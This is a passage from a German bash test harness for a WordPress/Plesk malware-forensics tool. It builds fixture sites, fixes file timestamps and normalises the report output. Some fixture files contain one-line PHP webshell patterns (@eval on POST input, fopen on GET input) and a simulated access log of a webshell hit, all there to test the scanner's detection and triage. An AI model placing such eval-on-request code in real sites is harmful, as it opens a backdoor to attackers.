      > "${k2}/wp-content/uploads/pruefstand/zerlegt.php"
  else
    printf '<?php\n$o="fopen"; $h=$o($_GET["d"],"w");\n' \
      > "${k2}/wp-content/uploads/pruefstand/zerlegt.php"
  fi
  printf '<?php\n$gruss = "Guten"." "."Tag"." "."allerseits";\n' \
    > "${k2}/wp-content/uploads/pruefstand/textverkettung.php"

  # ── Fremdbibliothek mit Mustertreffer (#46) ──────────────────────────
  # Der Fall, der die Quarantaeneliste unbrauchbar machte: legitimer
  # Bibliothekscode, der ein Muster enthaelt. Auf dem echten Server 156 von
  # 292 Eintraegen der kritischen Stufe — allein `Flate.php` 61 Mal.
  #
  # Er MUSS in der Sichtung landen, nicht in der Quarantaene. Und er muss
  # ueberhaupt erst einen Treffer erzeugen, sonst prueft die Trennung nichts.
  #
  # NT_PRUEFSTAND_OHNE_VENDORFILTER=1 legt dieselbe Datei ausserhalb von
  # vendor/ ab. Dann gehoert sie in die kritische Stufe — der Vergleich MUSS
  # das bemerken. Geprueft wird damit die Trennung, nicht die Anwesenheit.
  # UNTER pruefstand-kopflos, nicht unter pruefstand-kev: kopflos hat keine
  # Fassung und damit keinen Pruefsummensatz. Der erste Entwurf legte die
  # Datei unter kev ab — dort deckte der Satz des Pruefstands auch das
  # vendor/-Verzeichnis ab, die Datei wurde ENTLASTET und die Abschichtung
  # blieb ungeprueft. Die CI-Zusicherung hat genau das gemeldet.
  #
  # Das entspricht auch der Wirklichkeit: fuer die vendor/-Baeume
  # kommerzieller Plugins gibt es keinen Pruefsummensatz — das ist #30, und
  # genau deshalb braucht es diese Abschichtung ueberhaupt.
  local _vd="${k2}/wp-content/plugins/pruefstand-kopflos/vendor/setasign/fpdi"
  mkdir -p "$_vd"
  if [[ "${NT_PRUEFSTAND_OHNE_VENDORFILTER:-0}" != "1" ]]; then
    printf '<?php\n// Pruefstand: Bibliothekscode, Muster ohne Schadabsicht\n$x = "%s"; @eval($_POST[%sf%s]);\n' \
           "$(_hexkette)" "'" "'" > "${_vd}/Flate.php"
  else
    printf '<?php\n// Pruefstand: dieselbe Datei, aber NICHT unter vendor/\n$x = "%s"; @eval($_POST[%sf%s]);\n' \
           "$(_hexkette)" "'" "'" > "${k2}/wp-content/plugins/pruefstand-kopflos/Flate.php"
  fi

  # Dieselbe Abschichtung fuer die beiden Verzeichnisse, die am 14.08.2026
  # dazukamen. Ohne eigene Fixture waere ihre Aufnahme in VENDOR_PFADE eine
  # Behauptung: der vendor/-Fall oben bestuende auch dann, wenn 3rdparty/ und
  # libraries/ in der Liste fehlten.
  #
  # Beide Namen sind aelter als composer — Joomla legt Fremdbestandteile unter
  # libraries/ ab, TCPDF und PHPMailer unter 3rdparty/. Auf kundenserver42
  # standen 16 solcher Dateien in der Quarantaeneliste.
  #
  # Der Gegenprobenschalter gilt fuer alle drei zusammen: ohne Filter liegen
  # sie ausserhalb, und die kritische Stufe muss um genau drei wachsen.
  local _td="${k2}/wp-content/plugins/pruefstand-kopflos/3rdparty/tcpdf/fonts"
  local _ld="${k2}/wp-content/plugins/pruefstand-kopflos/libraries/joomla/filter"
  mkdir -p "$_td" "$_ld"
  if [[ "${NT_PRUEFSTAND_OHNE_VENDORFILTER:-0}" != "1" ]]; then
    printf '<?php\n// Pruefstand: TCPDF-Schriftpfad, Muster ohne Schadabsicht\n$x = "%s"; @eval($_POST[%st%s]);\n' \
           "$(_hexkette)" "'" "'" > "${_td}/dejavusans.php"
    printf '<?php\n// Pruefstand: Joomla-Bibliothek, Muster ohne Schadabsicht\n$x = "%s"; @eval($_POST[%sl%s]);\n' \
           "$(_hexkette)" "'" "'" > "${_ld}/InputFilter.php"
  else
    printf '<?php\n// Pruefstand: dieselbe Datei, aber NICHT unter 3rdparty/\n$x = "%s"; @eval($_POST[%st%s]);\n' \
           "$(_hexkette)" "'" "'" > "${k2}/wp-content/plugins/pruefstand-kopflos/dejavusans.php"
    printf '<?php\n// Pruefstand: dieselbe Datei, aber NICHT unter libraries/\n$x = "%s"; @eval($_POST[%sl%s]);\n' \
           "$(_hexkette)" "'" "'" > "${k2}/wp-content/plugins/pruefstand-kopflos/InputFilter.php"
  fi

  # ── Der Fall, in dem NICHTS uebrig bleibt ────────────────────────────
  # Kunde 1 ist die dritte Lage: ein Mustertreffer, und er ist entlastet.
  # Damit ist die Restliste LEER — und genau daran scheiterte der erste
  # Entwurf von 13d. Er trennte die beiden Bloecke mit `sed -n '1,/re/p'`,
  # und dieser Bereich prueft sein Endmuster erst ab Zeile 2. Stand der
  # Trenner auf Zeile 1, enthielten beide Haelften alles: auf dem echten
  # System erschien dieselbe Datei zugleich unter "kritisch" und unter
  # "entlastet".
  #
  # Kunde 2 und 3 konnten das nicht zeigen, weil dort immer etwas uebrig
  # blieb. Ein Pruefbaum, der nur den halbvollen Fall kennt, uebersieht den
  # leeren.
  local k1="${W}/kunde-eins.example/httpdocs"
  mkdir -p "${k1}/wp-includes"
  printf '<?php\n$wp_version = %s;\n' "'6.9.2'" > "${k1}/wp-includes/version.php"
  printf '<?php\n// Pruefstand: einziger Treffer, und entlastet\nif ( preg_match( %s/[^%s]*%s, $d ) ) { return true; }\n' \
         "'" "$(_hexkette)" "'" > "${k1}/wp-includes/class-pruefstand-nur-entlastet.php"
  wp_plugin "$k3" pruefstand-kev      3.0 "Pruefstand KEV"
  wp_plugin "$k3" pruefstand-alt      3.1 "Pruefstand Alt"
  wp_plugin "$k3" pruefstand-aktuell  4.0 "Pruefstand Aktuell"
  wp_theme  "$k3" pruefstand-thema    1.0 "Pruefstand Thema"
  wp_composer "$k3" pruefstand-kev 1.4.0

  # ── Sicherungskopien: duerfen NICHT als eigene Instanzen zaehlen ──
  # Die Tiefe ist Teil des Pruefgegenstands: Abschnitt 12b sucht mit
  # -maxdepth 6. Liegt die Kopie tiefer, wird sie ohnehin nie gefunden und der
  # Kopienfilter gar nicht erst befragt — der Test liefe ins Leere, ohne es zu
  # sagen. Gemessen am 07.08.2026: bei Tiefe 7 blieb das Abschalten des
  # Filters vollkommen wirkungslos. Deshalb liegt sie hier auf Tiefe 4.
  local bk="${W}/kunde-zwei.example/backups/updater-abc123"
  mkdir -p "${bk}/nextcloud-28.0.1.2-1700000000"
  cp -R "${k2n}/." "${bk}/nextcloud-28.0.1.2-1700000000/" 2>/dev/null || true
  mkdir -p "${W}/kunde-eins.example/backup/httpdocs"
  cp "${k1}/wp-config.php" "${W}/kunde-eins.example/backup/httpdocs/" 2>/dev/null || true

  # Plesk legt die Logs neben den vhosts ab; einige Abschnitte suchen dort.
  mkdir -p "${W}/system/kunde-zwei.example/logs"
  cat > "${W}/system/kunde-zwei.example/logs/access_log" <<'LOG'
203.0.113.7 - - [12/Mar/2026:03:14:07 +0100] "POST /wp-content/uploads/2026/03/bild.php HTTP/1.1" 200 42 "-" "curl/8.0"
203.0.113.7 - - [12/Mar/2026:03:14:09 +0100] "GET /wp-content/uploads/2026/03/logo.png?x=id HTTP/1.1" 200 17 "-" "curl/8.0"
198.51.100.4 - - [12/Mar/2026:09:01:00 +0100] "GET / HTTP/1.1" 200 4711 "-" "Mozilla/5.0"
LOG
  printf '[Thu Mar 12 03:14:07.000000 2026] [core:error] [pid 1] AH01797: client denied by server configuration: /remote.php\n' \
    > "${W}/system/kunde-zwei.example/logs/error_log"

  # Zugriffsprotokoll NEBEN dem belasteten vhost. Abschnitt 13e.4 sucht es
  # dort, nicht unter system/ — es bestimmt, wie weit die Quellen zurueckreichen.
  # Ohne dieses Verzeichnis meldete 13e.4 dauerhaft "nicht messbar", und der
  # ganze Zweig blieb ungeprueft.
  mkdir -p "${W}/kunde-zwei.example/logs"
  cp "${W}/system/kunde-zwei.example/logs/access_log" \
     "${W}/kunde-zwei.example/logs/access_log" 2>/dev/null || true
  # Ein rotiertes, komprimiertes Protokoll. 13e.4 wertet es bewusst NICHT aus,
  # sondern zaehlt es und sagt das — sonst laege die Reichweite der Quellen
  # weiter zurueck, als der Abschnitt belegen kann.
  : > "${W}/kunde-zwei.example/logs/access_log.1.gz"

  # ── ctime-Folge der belasteten Dateien festlegen (13e.1) ─────────────
  #
  # WARUM DAS HIER STEHT UND NICHT WEGNORMALISIERT WIRD
  #
  # Abschnitt 13e.1 ordnet nach ctime. Der Pruefstand legt seine Dateien in
  # Millisekunden an; ueberschreitet der Aufbau dabei eine Sekundengrenze,
  # bekommen einige Dateien N und andere N+1 — und die Achse kippt. Gemessen:
  # 3 von 10 Durchlaeufen wichen ab, ohne dass sich am Programm etwas geaendert
  # hatte.
  #
  # Die Reihenfolge IST die Aussage dieses Abschnitts. Sie wegzunormalisieren
  # hiesse, den einzigen Teil nicht zu pruefen, auf den es ankommt. Der
  # Pruefstand legt sie deshalb selbst fest.
  #
  # JE DATEI EINE EIGENE SEKUNDE. Nicht Gruppen — daran ist der erste Versuch
  # gescheitert: eine Gruppe von fuenf Dateien kann selbst eine Sekundengrenze
  # ueberschreiten, und dann kippt die Folge INNERHALB der Gruppe. Bei acht
  # verschiedenen ctimes gibt es keine Gleichstaende, also auch nichts, was
  # zufaellig anders sortieren koennte.
  #
  # `touch` ohne -t ist das richtige Mittel, nicht `chmod` und nicht ein
  # Hardlink: es setzt mtime UND ctime auf dieselbe Sekunde. Genau das ist der
  # ANKER-Fall aus 13e.2 — geschrieben und seither unberuehrt.
  #
  # Beide anderen Versuche sind daran gescheitert, und beide Gruende sind es
  # wert, hier zu stehen:
  #   `chmod` mit dem Modus, den die Datei schon hat, ruft chmod(2) gar nicht
  #   erst auf — die ctime blieb stehen, und der Eingriff tat nichts, ohne es
  #   zu sagen.
  #   Hardlink an/ab setzt die ctime zuverlaessig, laesst aber die mtime stehen.
  #   Damit lief die ctime der mtime davon, und die Dateien fielen aus dem
  #   ANKER-Fenster (2 s) heraus: aus 6 Ankern wurden je nach Laufzeit 3.
  #
  # Die beiden Sonderfaelle bekommen ihre mtime hier statt weiter oben, damit
  # ihre ctime in der richtigen Sekunde der Folge landet.
  if [[ "${NT_PRUEFSTAND_OHNE_ZEITFOLGE:-0}" != "1" ]]; then
    local k2c="${W}/kunde-zwei.example"

    # ── Erst den ganzen Baum auf EINE Sekunde stellen ──────────────────
    #
    # Der Aufbau dauert laenger als eine Sekunde und laenger als eine Minute.
    # Dateien bekommen dadurch verschiedene mtimes — je nachdem, wann der Lauf
    # zufaellig gestartet ist. Abschnitt 7.1 rankt nach mtime und schneidet bei
    # 50 ab; welche Datei die Abschneidung ueberlebt, haengt damit an der
    # Uhrzeit des Laufs statt am Programm.
    #
    # Das ist derselbe Fehler, den 07_dateisystem.sh:48 schon einmal
    # beschrieben hat — dort wurde der Sortierung ein zweiter Schluessel
    # gegeben. Der half nur gegen Gleichstaende; er half nicht dagegen, dass
    # die Zeiten ueberhaupt auseinanderlaufen. Solange die Ursache im
    # Pruefstand sitzt, gehoert sie auch dorthin.
    #
    # MITTERNACHT DES LAUFTAGS, nicht die laufende Minute. Der erste Versuch
    # nahm die laufende Minute — und scheiterte auf der CI: die acht Dateien der
    # Zeitfolge bekommen ihre mtime SPAETER, und ob das noch dieselbe Minute ist
    # oder schon die naechste, entscheidet wieder die Uhrzeit des Laufs. In
    # `find -ls` steht die Minute, also kippte die Rangfolge erneut.
    #
    # Mitternacht loest das: der ganze Baum liegt dann eindeutig VOR den acht
    # Dateien der Zeitfolge, egal wann der Lauf startet. Die Abschneidung bei 50
    # nimmt damit immer dieselben — die acht zuerst, dann der Rest nach Pfad.
    # Kein Datumsrechnen noetig, und der Wert bleibt sicher innerhalb der
    # 30-Tage-Fensters von Abschnitt 7.1.
    #
    # Ausgenommen: die Zeitstempel-Haeufung fuer 7.14. Ihr fester Wert IST der
    # Pruefgegenstand.
    local _stempel; _stempel="$(date '+%Y%m%d')0000.00"
    find "$W" -type f ! -name 'eintrag-*.dat' -exec touch -t "$_stempel" {} + 2>/dev/null || true
    # ZUERST der Massenvorgang — so wie auf dem echten Server, wo die
    # Wiederherstellung vom 19.02.2026 am Anfang der Achse stand und
    # `aeltester_nachweis` auf ihr Datum zog. Stuende er am Ende, bliebe genau
    # die Korrektur ungeprueft, um die es in #65 geht.
    #
    # EIN touch-Aufruf fuer alle fuenf, damit sie dieselbe ctime-Sekunde
    # teilen — so entsteht ein Block ohne Spanne.
    local _wh="${k2c}/httpdocs/wp-content/uploads/2026/03/wiederherstellung"
    if [[ "${NT_PRUEFSTAND_OHNE_MASSENVORGANG:-0}" != "1" ]]; then
      # Alte mtime, neue ctime → INODE. Fuenf von fuenf, also Mehrheit.
      touch -t 202402190838.41 "${_wh}"/bild*.png
    else
      # Frisch geschrieben → ANKER. Derselbe Block, andere Einordnung:
      # 13e.1 muss ihn dann Datei fuer Datei auf der Achse lassen, und
      # `aeltester_nachweis` faellt auf seine Zeit zurueck.
      touch "${_wh}"/bild*.png
    fi
    sleep 10
    # Erste echte Welle. Die robots.txt zuerst: sie ist im Anlassfall der
    # aelteste Beleg, weil sie einmal angefasst und nie wieder angesehen wurde.
    touch "${k2c}/httpdocs/robots.txt";                                        sleep 1
    touch "${k2c}/cloud.kunde-zwei.example/filefuns.php";                      sleep 1
    touch "${k2c}/backups/updater-abc123/nextcloud-28.0.1.2-1700000000/filefuns.php"; sleep 1
    touch "${k2c}/httpdocs/wp-content/plugins/beispiel-plugin/assets/banner.png"; sleep 1
    touch "${k2c}/httpdocs/wp-content/uploads/2026/03/clip.avi";               sleep 1
    touch "${k2c}/httpdocs/wp-content/uploads/2026/03/clip.mov"
    # Zweite Welle, zehn Sekunden spaeter. Mit URSACHE_WELLE_SEK=6 im Lauf
    # trennt 13e.1 hier — und NUR hier. Damit ist beides geprueft: dass ein
    # kleiner Abstand die Welle nicht aufschneidet, und dass ein grosser es tut.
    #
    # Warum 1 gegen 10 bei einer Schwelle von 6: `sleep 1` schlaeft
    # MINDESTENS eine Sekunde. Unter Last werden daraus auch mal vier — bei
    # einer Schwelle von 4 schnitt das die erste Welle auf und die Wellenzahl
    # sprang zwischen 2 und 3 (gemessen: 1 von 5 Durchlaeufen). Beide Margen
    # sind deshalb verdoppelt: ein Abstand INNERHALB einer Welle muesste jetzt
    # sechs Sekunden erreichen, ein Abstand ZWISCHEN zwei Wellen duerfte auf
    # sechs fallen. Beides ist weit ausserhalb dessen, was `sleep` verfehlt.
    sleep 10
    if [[ "${NT_PRUEFSTAND_OHNE_ZEITDEUTUNG:-0}" != "1" ]]; then
      touch -t 202401010422.05 "${k2c}/httpdocs/wp-content/mu-plugins/cache.php"
      touch -t 202812310422.05 "${k2c}/httpdocs/wp-content/uploads/2026/03/logo.png"
    else
      touch "${k2c}/httpdocs/wp-content/mu-plugins/cache.php"
      touch "${k2c}/httpdocs/wp-content/uploads/2026/03/logo.png"
    fi
  fi
}

# ── Normalisierung ───────────────────────────────────────────
# Jede Regel einzeln, jede mit Grund. Wer hier etwas ergaenzt, muss sagen
# koennen, warum der Wert sich zwangslaeufig aendert — sonst verdeckt die
# Regel eine echte Abweichung.
normalisieren() {
  # Der Arbeitspfad wird MITGEGEBEN statt nur ueber das feste Muster
  # 'nt-goldmuster/lauf' erkannt. Am 13.08.2026 lief eine Aufnahme mit
  # NT_GOLDMUSTER_DIR=/tmp/gm-belege — aufnehmen schreibt IMMER nach
  # pruefstand/referenz, das Muster griff nicht, und die eingecheckte
  # Referenz trug rohe /tmp-Pfade. Jeder folgende Vergleich schlug fehl und
  # sah aus wie Nichtdeterminismus des Programms.
  NT_ARBEIT_PFAD="$ARBEIT" python3 - "$1" <<'PY'
import os, re, sys

# Jede Regel einzeln, jede mit Grund. Wer hier etwas ergaenzt, muss sagen
# koennen, warum der Wert sich zwangslaeufig aendert.
REGELN = [
    # Lauf-ID <datum>_<host>_<scope>, z.B. 2026-09-01_12-50-23_k42_server.
    # Traegt die Uhrzeit -> je Lauf anders, muss weg. [\w.-]+ deckt host+scope
    # inkl. Domains (kunde.example) und Abo (abo-web178) ab.
    (r'\b\d{4}-\d{2}-\d{2}_\d{2}-\d{2}-\d{2}_[\w.-]+', '<LAUF-ID>'),  # neues Format
    (r'\b\d{8}_\d{6}_\w+',                         '<LAUF-ID>'),   # altes Format (Altbestand)
    (r'\b\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z',    '<UTC>'),
    # GNU-`stat` haengt Nanosekunden und Zeitzonenversatz an
    # ("2026-08-07 08:34:27.761970961 +0000"), BSD-`stat` nicht. Ohne den
    # optionalen Schwanz weicht jeder Lauf unter Linux ab — lokal auf macOS
    # war das nicht zu sehen, erst die CI hat es gezeigt.
    (r'\b\d{4}-\d{2}-\d{2} \d{2}:\d{2}(:\d{2})?(\.\d+)?( ?[+-]\d{4})?', '<ZEIT>'),
    (r'\b[0-9a-f]{64}\b',                          '<SHA256>'),    # Hashes des Laufordners
    (r'\b[0-9a-f]{40}\b',                          '<SHA1>'),
    # Der Pruefstand liegt je nach Plattform unter /tmp, /private/tmp oder
    # /var/folders und traegt die Prozessnummer im Namen.
    # \S trifft auch " und [ — die Regel frass damit die oeffnende
    # JSON-Syntax mit und machte die Referenz-findings.json ungueltig, ohne
    # dass es auffiel. Zeichenklasse deshalb ohne Anfuehrungszeichen und
    # Klammern.
    (r'[^\s"\'\[\],]*?[/.]nt-goldmuster/lauf',      '<PRUEFSTAND>'),
    # Der TATSAECHLICHE Arbeitspfad dieses Laufs, zusaetzlich zum festen
    # Muster darueber: mit gesetztem NT_GOLDMUSTER_DIR heisst er anders,
    # und ohne diese Regel stuenden rohe Pfade in der Referenz.
    (re.escape(os.environ.get('NT_ARBEIT_PFAD', '/nirgends')), '<PRUEFSTAND>'),
    (r'^(Server|Server-IP|Ausführender|Beginn \(lokal\)):.*$', r'\1: <UMGEBUNG>'),
    # Ausgabe von `date` — Format haengt an der Spracheinstellung, deshalb
    # ueber die umgebende Beschriftung gefasst statt ueber das Datumsmuster.
    (r'(\*Bericht erstellt am:).*?(\*)',            r'\1 <ZEIT>\2'),
    (r'(\| \*\*Lauf\*\* \|).*$',                    r'\1 <ZEIT> |'),
    (r'(Datum:\S*\s+).*$',                          r'\1<ZEIT>'),   # Kopfzeile der Konsole
    # Der Datenstand des Schwachstellenbestands. Er GEHOERT in den Bericht —
    # ein Befund ist nur so viel wert, wie sich der Bestand nachweisen laesst.
    # Nur: der Pruefstand erzeugt seinen Bestand bei jedem Bau mit dem Datum
    # von HEUTE (sonst waere er nach 30 Tagen "veraltet" und das Rezept
    # vergliche nicht mehr). Ohne diese Regel stimmt die eingecheckte Referenz
    # deshalb genau an dem Tag, an dem sie aufgenommen wurde, und schlaegt ab
    # dem naechsten Morgen aus — was dazu verfuehrt, sie einfach neu
    # aufzunehmen, bis niemand mehr hinsieht.
    (r'(Datenbestand \(Stand )\d{4}-\d{2}-\d{2}(\))', r'\1<STAND>\2'),
    # Das Alter des Wordfence-Scans wird gegen JETZT gerechnet und steigt
    # taeglich. Der Befund selbst gehoert in die Referenz, seine Zahl nicht —
    # sonst schlaegt der Vergleich ab dem naechsten Morgen aus.
    (r'(Wordfence-Scan ist )\d+( Tage alt)',      r'\1<TAGE>\2'),
    (r'(Wordfence-Scan )\d+( Tage alt)',          r'\1<TAGE>\2'),
    # Die Ausgabe von `date` erscheint an einem halben Dutzend Stellen mit je
    # eigener Beschriftung. Statt jede einzeln zu fassen, wird die Form selbst
    # erkannt: Wochentag, Monat, Tag, Uhrzeit, Zeitzone, Jahr. Eng genug, dass
    # sie nichts anderes trifft.
    (r'\b[A-Z][a-z]{2} +[A-Z][a-z]{2} +\d{1,2} +\d{2}:\d{2}:\d{2} +[A-Z]{2,5} +\d{4}\b', '<ZEIT>'),
    # Deutsches Format in Kunden- und Behoerdendokumenten: "07.08.2026, 10:28 Uhr"
    # und "07.08.2026 10:28". Das blosse Datum ohne Uhrzeit wird ebenfalls
    # ersetzt — es steht in erzeugten Dokumenten und wechselt taeglich.
    (r'\b\d{2}\.\d{2}\.\d{4},? +\d{2}:\d{2}(:\d{2})?( Uhr)?', '<ZEIT>'),
    (r'\b\d{2}\.\d{2}\.\d{4}\b',                    '<DATUM>'),
    # Abschnitt 13e.2 rechnet den Abstand zwischen mtime und ctime aus. Die
    # ctime ist die Sekunde, in der der Pruefstand die Datei angefasst hat —
    # der Abstand zu einer FESTEN mtime waechst also taeglich. Ohne diese
    # Regel schlaegt der Vergleich am naechsten Tag fehl, und zwar mit einem
    # Unterschied, der wie ein Programmfehler aussieht.
    #
    # Die Spanne selbst bleibt im Bericht und im Beleg stehen; hier wird nur
    # die normalisierte Fassung vergleichbar gemacht.
    (r'\b\d+ Tage \d+ h\b',                         '<SPANNE>'),
    # Pausen im SEKUNDENBEREICH gibt es nur im Pruefstand: mit der Vorgabe
    # URSACHE_WELLE_SEK=3600 ist jede echte Pause mindestens eine Stunde und
    # wird als "h"/"Tage" gerendert. Der Pruefstand senkt die Schwelle und
    # baut die Abstaende mit `sleep` — und `sleep 6` schlaeft MINDESTENS
    # sechs Sekunden, gelegentlich sieben. Gemessen: 4 von 4 Vergleichen
    # schlugen deshalb aus.
    #
    # Maskiert wird nur die ZAHL. Dass eine Pause an dieser Stelle steht — und
    # damit die Wellentrennung selbst — bleibt vollstaendig verglichen.
    (r'(── Pause: )\d+ s\b',                        r'\1<SPANNE> s'),
    # Dieselbe Sache in findings.json: die Zeitachse fuehrt ROHE Sekunden,
    # damit die Gegenstelle rechnen kann. Fuer alles, was der Pruefstand in
    # derselben Sekunde anlegt, ist das die Laufzeit — also je Lauf anders.
    # Eng an die vier Feldnamen gebunden, damit die Regel keine anderen Zahlen
    # trifft.
    #
    # Der Platzhalter steht IN Anfuehrungszeichen: die normalisierte Referenz
    # war bisher gueltiges JSON, und das soll sie bleiben. Ein Ersatz durch ein
    # nacktes <EPOCHE> haette sie unparsbar gemacht — geprueft wird zwar die
    # echte Datei, aber wer die Referenz aufmacht, erwartet zu Recht JSON.
    (r'"(ctime|mtime)":\d+',                        r'"\1":"<EPOCHE>"'),
    # Das (_roh)? ist nicht kosmetisch: aeltester_nachweis_roh kam mit #65
    # dazu und wurde von der Regel ohne diese Gruppe NICHT erfasst. Der Wert
    # ist eine lebende Epoche — die Referenz waere bei jedem Lauf anders
    # gewesen, und der Vergleich haette dauerhaft ausgeschlagen.
    (r'"(aeltester|juengster)_nachweis(_roh)?": *\d+', r'"\1_nachweis\2": "<EPOCHE>"'),
    (r'\| \*\*(Analysiert am|Server)\*\* \|.*$',   r'| **\1** | <UMGEBUNG> |'),
    # Aus `find -ls`: Inode und Blockzahl sind Eigenschaften des Dateisystems,
    # Eigentuemer und Gruppe die des ausfuehrenden Kontos, der Zeitstempel der
    # des Laufs. Keiner davon sagt etwas ueber das Programmverhalten.
    (r'^\s*\d+\s+\d+\s+([-drwxst@+.]{10})\s+\d+\s+\S+\s+\S+\s+(\d+)\s+'
     r'[A-Z][a-z]{2}\s+\d{1,2}\s+[\d:]+\s',        r'<INODE> \1 <EIGNER> \2 <MTIME> '),
    # Dieselbe Sache in `ls -l`-Form, ohne Inode und Blockzahl. Kommt aus den
    # Abschnitten, die nicht `find -ls` benutzen — beim ersten CI-Lauf uebersehen.
    (r'^([-drwxst@+.]{10})\s+\d+\s+\S+\s+\S+\s+(\d+)\s+'
     r'[A-Z][a-z]{2}\s+\d{1,2}\s+[\d:]+\s',        r'<INODE> \1 <EIGNER> \2 <MTIME> '),
    # Die Werkzeugfassung steigt bei jedem Release. Bewusst NUR dort ersetzt,
    # wo sie als Fassung auftritt — ein blindes \d+\.\d+\.\d+ hat im ersten
    # Anlauf auch Nextcloud-Versionen in Dateinamen getroffen und damit einen
    # echten Unterschied verdeckt.
    # WP-PLESK-FORENSIK: die Kopfzeile des Banners aus lib/konfig.sh. Sie fehlte
    # in dieser Liste, obwohl sie in jedem Lauf als erstes erscheint. Folge: nach
    # jedem Versionssprung schlug der Vergleich aus, wurde die Referenz neu
    # aufgenommen — und die Neuaufnahme uebernahm stillschweigend jede echte
    # Abweichung mit, die im selben Sprung entstanden war.
    (r'(wp_plesk_forensik\.sh |WP-PLESK-FORENSIK |NT-Forensik |Tool-Version: |\*\*Erstellt durch\*\* \| wp_plesk_forensik\.sh )v?\d+\.\d+\.\d+',
                                                    r'\1<FASSUNG>'),
    (r'"tool_version": "\d+\.\d+\.\d+"',            '"tool_version": "<FASSUNG>"'),
]

# find liefert Verzeichniseintraege in der Reihenfolge des Dateisystems. Die ist
# zwischen zwei Laeufen nicht stabil — gemessen am 07.08.2026: derselbe Stand,
# dieselben Dateien, andere Reihenfolge. Zusammenhaengende Bloecke solcher
# Zeilen werden deshalb sortiert. Das verdeckt keine Aenderung am Inhalt: eine
# hinzugekommene oder fehlende Datei faellt weiterhin auf.
LISTENZEILE = re.compile(r'^<INODE> ')

def normalisiere(zeile):
    for muster, ersatz in REGELN:
        zeile = re.sub(muster, ersatz, zeile)
    return zeile

zeilen = [normalisiere(z.rstrip('\n')) for z in open(sys.argv[1], encoding='utf-8', errors='replace')]

aus, block = [], []
for z in zeilen:
    if LISTENZEILE.match(z):
        block.append(z)
    else:
        if block: aus.extend(sorted(block)); block = []
        aus.append(z)
if block: aus.extend(sorted(block))
print('\n'.join(aus))
PY
}

# ── Lauf ─────────────────────────────────────────────────────
lauf_ausfuehren() {
  local W="$1" ABLAGE="$2"
  # Sprachumgebung festnageln. Die Normalisierungsregel fuer Zeitstempel
  # erkennt die englische Form von `date` ("Tue Aug 11 12:42:36 CEST 2026").
  # Auf einem deutsch eingestellten Rechner liefert `date` "Di 11. Aug
  # 12:42:36 CEST 2026", die Regel greift nicht, und der Vergleich schlaegt
  # bei JEDEM Lauf aus — er meldet dann nichts als die Uhrzeit und wird
  # dadurch wertlos. LC_ALL statt LANG, damit es auch eine gesetzte
  # LC_TIME ueberstimmt.
  #
  # URSACHE_WELLE_SEK=2: echte Wellenabstaende kann der Pruefstand nicht bauen,
  # dafuer braeuchte er Luecken in der ctime — und die laesst sich nicht setzen.
  # Er baut deshalb Abstaende von einer Sekunde und EINEN von drei (siehe
  # baum_bauen) und senkt die Schwelle auf sechs. Damit ist beides geprueft:
  # dass eine Sekunde die Welle NICHT aufschneidet und zehn es tun. Der grosse
  # Abstand nach beiden Seiten ist Absicht: `sleep 1` schlaeft mindestens eine
  # Sekunde, nicht genau eine — unter Last auch mal vier. Mit der Vorgabe
  # von einer Stunde bliebe die Wellentrennung in 13e.1 ganz ungeprueft.
  # Vertretbar, weil an dem Wert kein Befund haengt — er steuert nur, ob eine
  # Pause als eigene Zeile erscheint.
  #
  # ACHTUNG: Diese Zuweisungen sind EINE Befehlszeile mit Fortsetzungen. Ein
  # Kommentar dazwischen bricht sie auf, und der Lauf endet mit "muss als root
  # ausgefuehrt werden" — die Vorspann-Variablen erreichen das Skript dann
  # nicht mehr. Erlaeuterungen gehoeren deshalb hierher, vor den Block.
  LC_ALL=C LANG=C \
  NT_TESTLAUF=1 \
  NT_BASE_DIR="$ABLAGE" \
  NT_VHOSTS_DIR="$W" \
  WP_DATEN_DIR="${WP_DATEN_DIR:-$WPDATEN}" \
  WP_PRUEFSUMMEN_BASIS="${WP_PRUEFSUMMEN_BASIS:-$WPSUMMEN}" \
  NT_WEBSERVER="${NT_WEBSERVER:-nginx}" \
  NT_PMF_ATTRAPPE="${NT_PMF_ATTRAPPE-$PMFAUS}" \
  NT_WF_ATTRAPPE="${NT_WF_ATTRAPPE-$WFDATEN}" \
  NT_DB_ATTRAPPE="${NT_DB_ATTRAPPE-$DBDATEN}" \
  PATH="${ATTRAPPE}:$PATH" \
  URSACHE_WELLE_SEK=6 \
  URSACHE_MASSE_MIN=4 \
  bash "${SELF_DIR}/wp_plesk_forensik.sh" \
       --path "$W" --nur-website --kein-menue >"${ABLAGE}/konsole.txt" 2>&1
  local rc=$?
  # Der Rueckgabewert wird mitgeschrieben: eine Aenderung, die den Lauf
  # abbrechen laesst, waere sonst als leeres Ergebnis nicht unterscheidbar.
  echo "$rc" > "${ABLAGE}/rueckgabewert.txt"

  # Meldungen des Interpreters sind KEINE Ausgabe des Werkzeugs, sondern ein
  # Defekt. Der Vergleich allein faengt sie nicht: er prueft auf Gleichheit,
  # und eine Fehlermeldung, die in beiden Laeufen steht, gilt ihm als
  # unveraendert. Genau so ist ein "[[: 0 0: syntax error in expression" aus
  # rezept_kern in die eingecheckte Referenz gewandert und dort vier Laeufe
  # lang unbemerkt geblieben.
  #
  # Deshalb hier eine eigene Pruefung, unabhaengig vom Vergleich.
  local fund
  fund=$(grep -nE 'syntax error|unbound variable|command not found|: line [0-9]+:' \
              "${ABLAGE}/konsole.txt" 2>/dev/null | head -5 || true)
  if [[ -n "$fund" ]]; then
    echo -e "  ${RED}❌${NC} Der Lauf hat Interpreter-Fehler ausgegeben:" >&2
    printf '     %s\n' "$fund" >&2
    echo "     Das ist ein Defekt, keine Ausgabe. Beheben, nicht in die Referenz aufnehmen." >&2
    return 1
  fi
  return 0
}

ausgabe_einsammeln() {
  local ABLAGE="$1" ZIEL="$2"
  local lauf; lauf=$(find "${ABLAGE}/forensik" -maxdepth 1 -type d -name '2*' 2>/dev/null | head -1)
  [[ -n "$lauf" ]] || fail "Kein Laufordner unter ${ABLAGE}/forensik entstanden — siehe ${ABLAGE}/konsole.txt"
  mkdir -p "$ZIEL"
  # Seit v3.11 zwei Spuren. Der Dateiname im Vergleichsordner traegt die Spur
  # mit, damit eine Verschiebung zwischen kunde/ und betreiber/ als Aenderung
  # auffaellt statt still durchzugehen.
  local d
  for d in kunde/kundenbericht.md kunde/befunde_details.md kunde/root_aussage.md \
           betreiber/technik_bericht.md betreiber/bsi_meldung.md \
           betreiber/dsgvo_meldung.md betreiber/findings.json; do
